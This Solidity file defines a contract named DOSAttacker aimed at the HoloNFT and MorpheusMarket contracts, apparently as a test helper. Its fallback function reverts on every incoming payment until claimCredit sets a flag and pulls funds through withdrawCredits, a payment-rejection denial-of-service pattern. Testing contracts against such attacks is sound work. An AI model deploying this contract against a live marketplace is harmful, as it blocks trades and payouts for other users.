// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../HoloNFTStore-contracts/HoloNFT.sol";
import "../HoloNFTStore-contracts/MorpheusMarket.sol";

contract DOSAttacker {

    HoloNFT public holoNFT;
    MorpheusMarket public market;

    bool private acceptPayment;

    constructor(address holoNFTAddress, address morpheusMarketAddress) {
        holoNFT = HoloNFT(holoNFTAddress);
        market = MorpheusMarket(morpheusMarketAddress);
        acceptPayment = false;
    }

    // reject payment if other people send to this contract
    // accept payment if it pull via withdraw function
    fallback() external payable {
        if(acceptPayment)
        {
            // acceptPayment = false;
        }
        else
        {
            assert(false);
        }
    }

    function approve(address to, uint256 tokenId) public {
        holoNFT.approve(to,tokenId);
    }

    function openTrade(uint256 tokenId, uint248 newPrice) public{
        market.openTrade(tokenId, newPrice);
    }

    function claimCredit() public{
        acceptPayment = true;
        market.withdrawCredits();
    }
}
